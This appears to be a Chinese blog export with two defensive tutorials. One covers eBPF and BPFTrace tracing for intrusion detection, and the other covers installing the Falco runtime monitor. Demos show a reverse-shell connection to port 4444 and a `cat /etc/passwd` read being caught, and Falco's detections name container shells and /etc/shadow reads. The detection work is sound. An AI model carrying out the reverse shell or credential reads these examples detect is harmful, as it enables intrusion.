<p><img src="../images/pic/k8s16.jpg"> </p>
<h2 id="2-eBPF程序类型"><a href="#2-eBPF程序类型" class="headerlink" title="2. eBPF程序类型"></a>2. eBPF程序类型</h2><p>我们可以简单地将eBPF程序的类型分为两个方面：网络和追踪。</p>
<p><strong>1. 网络</strong></p>
<p>相对于系统的性能分析和观测，eBPF 技术在网络技术中的表现，更是让人眼前一亮。eBPF允许开发者监控并操作计算机系统中的网络流量，这也是BPF原始设计时的核心功能点。</p>
<p>BPF 技术与 XDP（eXpress Data Path） 和 TC（Traffic Control） 组合可以实现功能更加强大的网络功能，XDP 只作用与网络包的进入过程，BPF 钩子位于<strong>网络驱动中尽可能早的位置</strong>，<strong>无需进行原始包的复制</strong>就可以实现最佳的数据包处理性能，挂载的 BPF 程序是运行过滤的理想选择，可用于丢弃恶意或非预期的流量、进行 DDOS 攻击保护等场景，在流量越早期阶段处理，就可以节省处理流量的性能；而 TC Ingress 比 XDP 技术处于更高层次的位置，BPF 程序在 L3 层之前运行，可以访问到与数据包相关的大部分元数据，是本地节点处理的理想的地方，可以用于流量监控或者 L3/L4 的端点策略控制，同时配合 TC egress 则可实现对于容器环境下更高维度和级别的网络结构。</p>
<p>XDP 技术架构:</p>
<p><img src="../images/pic/k8s15.jpg"> </p>
<p><strong>2. 追踪</strong></p>
<p>eBPF可以通过各种类型的追踪点访问与特定与特定程序相关的内存区域，从正在运行的进程中提取信息并执行跟踪。在安全检测上，我们可以将eBPF程序的追踪点加载到一些关键并且不是很频繁的内核行为上，比如创建一个新的TCP会话、fork新的进程、特权提升等，这样就可以通过对这些行为的追踪进行异常检测。</p>
<h2 id="3-eBPF工具"><a href="#3-eBPF工具" class="headerlink" title="3. eBPF工具"></a>3. eBPF工具</h2><p>现在已经有很多开源eBPF实现</p>
<h3 id="3-1-BCC"><a href="#3-1-BCC" class="headerlink" title="3.1 BCC"></a>3.1 BCC</h3><p><a href="https://github.com/iovisor/bcc">BCC</a>（BPF Compiler Collection）是高效创建eBPF程序的工具包，BCC把eBPF程序的编译、加载等功能都集成起来，提供友好的接口给用户。它使用了“python+Lua+C++”的混合架构，底层操作封装到C++库中，Lua提供一下辅助功能，使用Python提供用户的接口，Python和C++之间的调用使用ctypes连接。</p>
<h3 id="3-2-BPFTrace"><a href="#3-2-BPFTrace" class="headerlink" title="3.2 BPFTrace"></a>3.2 BPFTrace</h3><p>BPFTrace是eBPF的高级追踪语言。它允许开发者使用简洁的领域特定语言（DSL）编写eBPF程序，并将它们保存为脚本，开发者可以执行这些脚本，而不必在内核中手动编译和加载。</p>
<p>与直接使用BCC不同的是，使用BPFTrace提供了许多不需要自己实现的内置功能，比如聚合信息和创建直方图。</p>
<h3 id="3-3-BPFTrace安装"><a href="#3-3-BPFTrace安装" class="headerlink" title="3.3 BPFTrace安装"></a>3.3 BPFTrace安装</h3><p>docker 安装并运行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -ti -v <span class="regexp">/usr/</span>src:<span class="regexp">/usr/</span>src:ro \</span><br><span class="line">       -v <span class="regexp">/lib/m</span>odules<span class="regexp">/:/</span>lib/modules:ro \</span><br><span class="line">       -v <span class="regexp">/sys/</span>kernel<span class="regexp">/debug/</span>:<span class="regexp">/sys/</span>kernel/debug:rw \</span><br><span class="line">       --net=host --pid=host --privileged \</span><br><span class="line">       quay.io<span class="regexp">/iovisor/</span>bpftrace:latest</span><br></pre></td></tr></table></figure>







<h2 id="4-使用BPFTrace实现动态追踪"><a href="#4-使用BPFTrace实现动态追踪" class="headerlink" title="4. 使用BPFTrace实现动态追踪"></a>4. 使用BPFTrace实现动态追踪</h2><p><strong>探针类型</strong></p>
<p>动态追踪都是探针机制实现的，探针是用于捕获事件数据的检测点，BPFTrace在实现内核行为追踪时使用的探针主要包括动态探针（Kprobe/Kretprobe）和静态探针（Tracepoint）两种。</p>
<p><strong>动态探针：Kprobe/Kretprobe</strong></p>
<p>eBPF支持内核探针功能，允许开发者在几乎所有的内核指令中以最小的开销设置动态的标记或中断。当内核运行到某个标记的时候，就会执行附加到这个探测点上的代码，然后恢复正常的流程。对内核行为的追踪探测，可以获取内核中发生任何事件的信息，比如系统中打开的文件、正在执行的二进制文件、系统中发生的TCP连接等。</p>
<p>内核动态探针可以分为两种：Kprobe和Kretprobe。二者的区别在于，根据探针执行周期的不同阶段，来确定插入eBPF程序的位置。Kprobe类型的探针用于跟踪内核函数调用，是一种功能强大的探针类型，让我们可以追踪成千上万的内核函数。由于它们是用来跟踪底层内核的，开发者需要熟悉内核源代码，理解这些探针的参数、返回值的意义。</p>
<p>Kprobe通常在内核函数执行前插入eBPF程序，而Kretprobe在执行完毕返回之后，插入相应的的eBPF程序。比如，tcp_connect()是一个内核函数，当有TCP连接发生时将调用该函数，那么如果对tcp_connect()使用Kprobe探针，则对应的eBPF程序会在tcp_connect()被调用时执行，而如果使用Kretprobe探针，则eBPF程序会在tcp_connect()返回时执行。</p>
<p>尽管Kprobe运行在执行任何内核功能之前插入eBPF程序。但是，它是一种“不稳定”的探针类型，开发者在使用Kprobe时，需要知道想要追踪的函数签名。而Kprobe当前咩有稳定的应用程序二进制接口（ABI），这意味着它们可能在不同的内核版本之间发生变化。内核版本不同，内核函数名、参数、返回值等可能会变化。</p>
<p>使用如下命令可以查看当前版本内核所支持的Kprobe探针列表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@vuln ~]<span class="comment"># bpftrace -l &#x27;kprobe:tcp*&#x27;</span></span><br><span class="line">kprobe:tcp_mmap</span><br><span class="line">kprobe:tcp_get_info_chrono_stats</span><br><span class="line">kprobe:tcp_init_sock</span><br><span class="line">kprobe:tcp_splice_data_recv</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<p><strong>静态探针：Tracepoint</strong></p>
<p>Tracepoint是在内核代码中所做的一种静态标记，是开发者在内核源代码中散落的一些hook，开发者可以依托这些hook实现相应的追踪代码插入。</p>
<p>开发者在/sys/kernel/debug/tracing/events/目录下，可以查看当前版本的内核支持的所有Tracepoint，在每一个具体Tracepoint目录下，都会有一系列对其进行配置说明的文件，比如可以通过enable中的值设置该Tracepoint探针的开关等。</p>
<p>与Kprobe相比，它们的主要区别在于，Tracepoint是内核开发人员已经在内核代码中提前埋好的，这也是为什么称它们为静态探针的原因。而Kprobe更多的是跟踪内核函数的进入和返回，因此称为动态的探针。但是内核函数会随着内核的发展而出现谋者小时，因此Krobe对内核版本有着相对较强的依赖性，因此相比于Kprobe探针，更喜欢用Tracepoint探针，因为Tracepoint有着更稳定的应用程序编程接口，而且在内核中保持着向前兼容。</p>
<p>Tracepoint的不足之处在于，这些探针需要开发人员将它们添加到内核中，因此，它们可能不会覆盖内核的所有子系统，只能使用当前版本内核所支持的探测点。我们可以通过如下BPFTrace命令列出当前版本内核所支持的Tracepoint探针列表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@vuln alarmtimer]<span class="comment"># bpftrace -l &#x27;tracepoint:*&#x27;</span></span><br><span class="line">tracepoint:vb2:vb2_buf_done</span><br><span class="line">tracepoint:vb2:vb2_buf_queue</span><br><span class="line">tracepoint:vb2:vb2_dqbuf</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<p><strong>其他探针：</strong></p>
<p>除了签名介绍的探针外，eBPF还支持对用户态程序通过探针进行追踪。例如用户态的Uprobe/Uretprobe探针，在用户态函数进行hook，实现与Kprobe/Kretprobe类似的功能；再比如USDT（User Static Defined Tracepoint）探针，是用户态的Tracepoint,需要开发者在用户态中自己埋点Tracepoint，实现与内核Tracepoint类似的功能。</p>
<h3 id="4-1-使用BPFTrace进行追踪"><a href="#4-1-使用BPFTrace进行追踪" class="headerlink" title="4.1 使用BPFTrace进行追踪"></a>4.1 使用BPFTrace进行追踪</h3><p>BPFTrace的一个方便之处在于，其既可以通过一个命令行完成简单动态追踪，又可以按照其规定的语法结构，将其追踪逻辑编辑成可执行脚本。</p>
<p><strong>1. 命令行</strong></p>
<p>下面我们尝试一些命令</p>
<p>1）列出支持的探针</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bpftrace</span> -l <span class="string">&#x27;tracepoint:syscalls:sys_enter_*&#x27;</span></span><br></pre></td></tr></table></figure>

<p>bpftrace -l 可以列出支持的所有探针，可以通过引号内的条件对结果进行过滤。</p>
<p>2）打印Hello World</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@vuln alarmtimer]<span class="comment"># bpftrace -e &#x27;BEGIN &#123; printf(&quot;hello world\n&quot;); &#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>命令中的 -e ‘program’表示将要执行这个程序。BEGIN是一个特殊的探针，在程序开始执行时触发探针执行，可以使用它设置变量和打印消息头。BEGIN探针后“{}”内是与该探针关联的动作。</p>
<p>3）追踪文件打开</p>
<p>这个命令可以在文件打开时，追踪并打印出进程名以及对应的文件名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@vuln alarmtimer]<span class="comment"># bpftrace -e &#x27;tracepoint:syscalls:sys_enter_openat &#123; printf(&quot;%s %s\n&quot;, comm, str(args-&gt;filename)); &#125;&#x27;</span></span><br><span class="line">27m</span><br><span class="line"><span class="string">&quot;, comm, str(args-&gt;filename)); &#125;&#x27;]Attaching 1 probe...</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">cat /etc/passwd</span></span><br></pre></td></tr></table></figure>

<p>当我们运行上述命令，再另一个终端执行<code>cat /etc/passwd</code>的时候我们可以发现上述命令捕获到了此行为。</p>
<p><code>tracepoint:syscalls:sys_enter_openat</code>表示这是一个Tracepoint探针，当进入openat()系统调用时执行该探针，comm是内建变量，代表当前进程的名称，其他类似变量还有pid,tid，分别表示进程标识和线程标识。args是一个指针，指向该tracepoint的参数。</p>
<p><strong>2 追踪脚本</strong></p>
<p>除了上诉命令行方式之外，我们还可以将复杂的追踪命令编写成特定的脚本，然后通过bpftrace命令执行这个脚本完成我们要追踪的目标。     </p>
<p>我们通过克隆项目获取<a href="https://github.com/iovisor/bpftrace">bpftrace github</a>的tools目录下的自带脚本</p>
<p>比如我们使用tcpconnect.bt脚本</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">bpftrace <span class="built_in">tcpconnect</span>.bt</span><br></pre></td></tr></table></figure>

<p>当我们在另一个终端反弹shell的时候，发现捕获到了网络连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vuln:~/bpftrace/tools<span class="comment"># bpftrace tcpconnect.bt</span></span><br><span class="line">Attaching 2 probes...</span><br><span class="line">Tracing tcp connections. Hit Ctrl-C to end.</span><br><span class="line">TIME     PID      COMM             SADDR                                   SPORT  DADDR                                   DPORT</span><br><span class="line">06:15:03 6029     bash             172.16.42.151                           40746  172.16.42.100                           4444</span><br></pre></td></tr></table></figure>







<p>常见的一些网络探针脚本</p>
<table>
<thead>
<tr>
<th><strong>编号</strong></th>
<th><strong>脚本</strong></th>
<th><strong>使用探针</strong></th>
<th><strong>实现功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td>tcpaccept.bt</td>
<td>kretprobe:inet_csk_accept</td>
<td>追踪TCP套接字accept()操作</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>tcpconnect.bt</td>
<td>kprobe:tcp_connect</td>
<td>追踪所有的TCP连接操作</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>tcpdrop.bt</td>
<td>kprobe:tcp_drop</td>
<td>追踪TCP丢包详情</td>
</tr>
<tr>
<td><strong>4</strong></td>
<td>tcplife.bt</td>
<td>kprobe:tcp_set_state</td>
<td>追踪TCP连接生命周期详情</td>
</tr>
<tr>
<td><strong>5</strong></td>
<td>tcpretrans.bt</td>
<td>kprobe:tcp_retransmit_skb</td>
<td>追踪TCP重传</td>
</tr>
<tr>
<td><strong>6</strong></td>
<td>tcpsynbl.bt</td>
<td>kprobe:tcp_v4_syn_recv_sock kprobe:tcp_v6_syn_recv_sock</td>
<td>以柱状图的形式显示TCP SYN backlog</td>
</tr>
</tbody></table>
<p>安全探针脚本</p>
<table>
<thead>
<tr>
<th><strong>编号</strong></th>
<th><strong>脚本</strong></th>
<th><strong>使用探针</strong></th>
<th><strong>实现功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td>capable.bt</td>
<td>kprobe:cap_capable</td>
<td>追踪capabilitiy的使用</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>oomkill.bt</td>
<td>kprobe:oom_kill_process</td>
<td>追踪OOM killer</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>setuids.bt</td>
<td>tracepoint:syscalls:sys_enter_setuid tracepoint:syscalls:sys_enter_setfsuid tracepoint:syscalls:sys_enter_setresuid tracepoint:syscalls:sys_exit_setuid tracepoint:syscalls:sys_exit_setfsuid tracepoint:syscalls:sys_exit_setresuid</td>
<td>跟踪通过setuid系统调用实现特权升级</td>
</tr>
</tbody></table>
<p>系统探针脚本</p>
<table>
<thead>
<tr>
<th><strong>编号</strong></th>
<th><strong>脚本</strong></th>
<th><strong>使用探针</strong></th>
<th><strong>实现功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td>bashreadline.bt</td>
<td>uretprobe:/bin/bash:readline</td>
<td>打印从所有运行shell输入的bash命令</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>execsnoop.bt</td>
<td>tracepoint:syscalls:sys_enter_execve</td>
<td>追踪通过exec()系统调用产生新进程</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>killsnoop.bt</td>
<td>tracepoint:syscalls:sys_enter_kill tracepoint:syscalls:sys_exit_kill</td>
<td>追踪kill()系统调用</td>
</tr>
<tr>
<td><strong>4</strong></td>
<td>naptime.bt</td>
<td>tracepoint:syscalls:sys_enter_nanosleep</td>
<td>跟踪应用程序通过nanosleep(2)系统调用休眠</td>
</tr>
<tr>
<td><strong>5</strong></td>
<td>opensnoop.bt</td>
<td>tracepoint:syscalls:sys_enter_open tracepoint:syscalls:sys_enter_openat tracepoint:syscalls:sys_exit_open tracepoint:syscalls:sys_exit_openat</td>
<td>追踪全系统范围内的open()系统调用，并打印详细信息</td>
</tr>
<tr>
<td><strong>6</strong></td>
<td>pidpersec.bt</td>
<td>tracepoint:sched:sched_process_fork</td>
<td>追踪新进程产生速率</td>
</tr>
<tr>
<td><strong>7</strong></td>
<td>statsnoop.bt</td>
<td>tracepoint:syscalls:sys_enter_statfs tracepoint:syscalls:sys_enter_statx, tracepoint:syscalls:sys_enter_newstat tracepoint:syscalls:sys_enter_newlstat tracepoint:syscalls:sys_exit_statfs tracepoint:syscalls:sys_exit_statx tracepoint:syscalls:sys_exit_newstat tracepoint:syscalls:sys_exit_newlstat</td>
<td>追踪系统范围内的不同stat()系统调用</td>
</tr>
<tr>
<td><strong>8</strong></td>
<td>swapin.bt</td>
<td>kprobe:swap_readpage</td>
<td>按进程计算交换次数，以显示哪个进程受到交换的影响</td>
</tr>
<tr>
<td><strong>9</strong></td>
<td>syncsnoop.bt</td>
<td>tracepoint:syscalls:sys_enter_sync tracepoint:syscalls:sys_enter_syncfs tracepoint:syscalls:sys_enter_fsync tracepoint:syscalls:sys_enter_fdatasync tracepoint:syscalls:sys_enter_sync_file_range tracepoint:syscalls:sys_enter_msync</td>
<td>追踪sync相关的各种系统调用</td>
</tr>
<tr>
<td><strong>10</strong></td>
<td>syscount.bt</td>
<td>tracepoint:raw_syscalls:sys_enter</td>
<td>对系统调用进行追踪计数，并打印前10个系统调用id和前10个生成系统调用的进程名的摘要</td>
</tr>
<tr>
<td><strong>11</strong></td>
<td>threadsnoop.bt</td>
<td>uprobe:/lib/x86_64-linux-gnu/libpthread.so.0:pthread_create</td>
<td>追踪新线程</td>
</tr>
<tr>
<td><strong>12</strong></td>
<td>xfsdist.bt</td>
<td>kprobe:xfs_file_read_iter kprobe:xfs_file_write_iter kprobe:xfs_file_open kprobe:xfs_file_fsync kretprobe:xfs_file_read_iter kretprobe:xfs_file_write_iter kretprobe:xfs_file_open kretprobe:xfs_file_fsync</td>
<td>追踪XFS的读、写、打开和fsync，并将它们的延迟汇总为一个2次方直方图</td>
</tr>
</tbody></table>
<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h2><ul>
<li><a href="https://cloudnative.to/blog/bpf-intro">https://cloudnative.to/blog/bpf-intro</a></li>
<li>《云原生安全攻防实践与体系构建》</li>
<li><a href="http://blog.nsfocus.net/bpftrace-dynamic-tracing-0828/">http://blog.nsfocus.net/bpftrace-dynamic-tracing-0828/</a></li>
</ul>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>eBPF</tag>
      </tags>
  </entry>
  <entry>
    <title>falco介绍及使用经验</title>
    <url>/falco%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8%E7%BB%8F%E9%AA%8C/</url>
    <content><![CDATA[<p>falco介绍、使用方法、规则编写以及自己的使用经验</p>
<span id="more"></span>


<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Falco 是一款旨在检测应用中反常活动的行为监视器，由<a href="https://github.com/draios/sysdig">Sysdig</a>的<a href="https://sysdig.com/blog/fascinating-world-linux-system-calls/">系统调用捕获</a>基础设施驱动。您仅需为 Falco 撰写<a href="https://falco.org/docs/rules">一套规则</a>，即可在一处持续监测并监控容器、应用、主机及网络的异常活动。</p>
<h2 id="Falco-的体系结构"><a href="#Falco-的体系结构" class="headerlink" title="Falco 的体系结构"></a>Falco 的体系结构</h2><p>Falco 可以发现和告警系统调用的任何行为。Falco告警触发方式可以是：特殊的系统调用、参数、调用进程的属性</p>
<p>Falco在用户空间和系统空间运行，系统调用由Falco的内核模块读取，然后使用用户空间的库来分析。当配置一个规则后，系统调用事件通过规则引擎过滤。可疑的事件通过Syslog、文件、标准输出等方式输出。</p>
<p><img src="../images/pic/falco.png"></p>
<h2 id="Falco可检测那些行为"><a href="#Falco可检测那些行为" class="headerlink" title="Falco可检测那些行为"></a>Falco可检测那些行为</h2><p>Falco 可以监测调用 <a href="http://man7.org/linux/man-pages/man2/syscalls.2.html">Linux 系统调用</a>的行为，并根据其不同的调用、参数及调用进程的属性发出警告。例如，Falco 可轻松检测：</p>
<ul>
<li>容器内运行的 Shell</li>
<li>服务器进程产生意外类型的子进程</li>
<li>敏感文件读取（如 <code>/etc/shadow</code>）</li>
<li>非设备文件写入至 <code>/dev</code></li>
<li>系统的标准二进制文件（如 <code>ls</code>）产生出站流量</li>
</ul>
<h2 id="与其他工具对比"><a href="#与其他工具对比" class="headerlink" title="与其他工具对比"></a>与其他工具对比</h2><p>我们常常会被问到 Falco 与 <a href="https://en.wikipedia.org/wiki/Security-Enhanced_Linux">SELinux</a>、<a href="https://wiki.ubuntu.com/AppArmor">AppArmor</a>、<a href="https://linux.die.net/man/8/auditd">Auditd</a> 或其他 Linux 安全策略工具有何不同。为此，我们在 <a href="https://sysdig.com/blog">Sysdig 博客</a>上撰写了<a href="https://sysdig.com/blog/selinux-seccomp-falco-technical-discussion/">一篇博文</a>，并详细对比了多款工具。</p>
<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>Falco 应作为守护程序部署。您可将其作为一款 <a href="https://falco.org/docs/getting-started/installation#debian">deb</a>/<a href="https://falco.org/docs/getting-started/installation#centos-rhel">rpm</a> 软件包安装在主机或容器宿主上，亦或可以作为<a href="https://falco.org/docs/getting-started/running#docker">容器</a>部署。当然，您也可以下载<a href="https://falco.org/docs/getting-started/source">源代码</a>并自己动手编译安装。</p>
<p>您可通过<a href="https://falco.org/docs/rules">规则文件</a>或<a href="https://falco.org/docs/configuration">通用配置文件</a>定义 Falco 应监视的行为及事件。我们提供了一份示例规则文件 <a href="https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml"><code>./rules/falco_rules.yaml</code></a>，您可随意修改规则来适配您的工作环境。</p>
<p>当您撰写规则时，Falco 可读取由 Sysdig 产生的回溯文件。这一特性可让您在调整规则时“录制”有害行为，并无限次数地回放。</p>
<p>部署后，Falco 将利用 Sysdig 内核模块及用户空间函数库来监控规则文件定义中的任意事件。若异常事件发生，Falco 会将通知信息写入您所配置的输出中。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>二进制安装</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line"><span class="attribute">curl</span> -L -O https://dl.bintray.com/falcosecurity/bin/x<span class="number">86</span>_<span class="number">64</span>/falco-<span class="number">0</span>.<span class="number">26</span>.<span class="number">2</span>-x<span class="number">86</span>_<span class="number">64</span>.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line"><span class="attribute">tar</span> -xvf falco-<span class="number">0</span>.<span class="number">26</span>.<span class="number">2</span>-x<span class="number">86</span>_<span class="number">64</span>.tar.gz</span><br><span class="line"><span class="attribute">cp</span> -R falco-<span class="number">0</span>.<span class="number">26</span>.<span class="number">2</span>-x<span class="number">86</span>_<span class="number">64</span>/* /</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装kernel headers</span></span><br><span class="line"><span class="attribute">yum</span> -y install kernel-devel-$(uname -r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装driver</span></span><br><span class="line"><span class="comment">## 使用/usr/bin/falco-driver-loader安装driver。机制都是优先尝试本地编译，失败则下载编译好的版本至~/.falco/。</span></span><br><span class="line"><span class="attribute">falco</span>-driver-loader module</span><br><span class="line"><span class="attribute">falco</span>-driver-loader bpf</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行</span></span><br><span class="line"><span class="attribute">falco</span></span><br></pre></td></tr></table></figure>



<p><strong>helm安装</strong></p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta">#配置本地仓库</span></span><br><span class="line">helm repo add falcosecurity https:<span class="comment">//falcosecurity.github.io/charts</span></span><br><span class="line"><span class="meta">#更新</span></span><br><span class="line">helm repo update</span><br><span class="line"><span class="meta">#安装</span></span><br><span class="line">helm install falco falcosecurity/falco</span><br><span class="line"><span class="meta">#卸载falco</span></span><br><span class="line">helm uninstall falco</span><br></pre></td></tr></table></figure>



<p><strong>容器安装</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">		--name falco \</span><br><span class="line">    --privileged \</span><br><span class="line">    -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>host<span class="regexp">/var/</span>run/docker.sock \</span><br><span class="line">    -v <span class="regexp">/dev:/</span>host/dev \</span><br><span class="line">    -v <span class="regexp">/proc:/</span>host/proc:ro \</span><br><span class="line">    -v <span class="regexp">/boot:/</span>host/boot:ro \</span><br><span class="line">    -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/host/</span>lib/modules:ro \</span><br><span class="line">    -v <span class="regexp">/usr:/</span>host/usr:ro \</span><br><span class="line">    -v <span class="regexp">/etc:/</span>host/etc:ro \</span><br><span class="line">    -v <span class="regexp">/etc/</span>falco:<span class="regexp">/etc/</span>falco \</span><br><span class="line">    falcosecurity/falco:latest</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#运行时指定日志输出位置</span></span><br><span class="line">docker run --rm -it \</span><br><span class="line">		--name falco \</span><br><span class="line">    --privileged \</span><br><span class="line">    -v <span class="regexp">/var/</span>run<span class="regexp">/docker.sock:/</span>host<span class="regexp">/var/</span>run/docker.sock \</span><br><span class="line">    -v <span class="regexp">/dev:/</span>host/dev \</span><br><span class="line">    -v <span class="regexp">/proc:/</span>host/proc:ro \</span><br><span class="line">    -v <span class="regexp">/boot:/</span>host/boot:ro \</span><br><span class="line">    -v <span class="regexp">/lib/m</span>odules:<span class="regexp">/host/</span>lib/modules:ro \</span><br><span class="line">    -v <span class="regexp">/usr:/</span>host/usr:ro \</span><br><span class="line">    -v <span class="regexp">/etc:/</span>host/etc:ro \</span><br><span class="line">    -v <span class="regexp">/etc/</span>falco:<span class="regexp">/etc/</span>falco \</span><br><span class="line">    --log-driver syslog \</span><br><span class="line">    --log-opt syslog-address=udp:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.17</span>:<span class="number">555</span> \</span><br><span class="line">    falcosecurity/falco:latest</span><br></pre></td></tr></table></figure>



<p><strong>集群yaml安装</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">falco-agent</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">falco-agent</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">falco-agent</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">falco-agent</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">falco</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">falcosecurity/falco:latest</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">securityContext:</span></span><br><span class="line">            <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">args:</span> [<span class="string">&quot;/usr/bin/falco&quot;</span>, <span class="string">&quot;--cri&quot;</span>, <span class="string">&quot;/host/run/containerd/containerd.sock&quot;</span>]</span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/var/run/docker.sock</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">docker-socket</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/run/containerd/containerd.sock</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">containerd-socket</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/dev</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">dev-fs</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/proc</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">proc-fs</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/boot</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">boot-fs</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/lib/modules</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">lib-modules</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/usr</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">usr-fs</span></span><br><span class="line">              <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/host/etc</span></span><br><span class="line">              <span class="attr">name:</span> <span class="string">host-etc</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">docker-socket</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">containerd-socket</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/run/containerd/containerd.sock</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dev-fs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/dev</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc-fs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/proc</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">boot-fs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/boot</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lib-modules</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/lib/modules</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">usr-fs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/usr</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-etc</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/etc</span></span><br><span class="line"></span><br><span 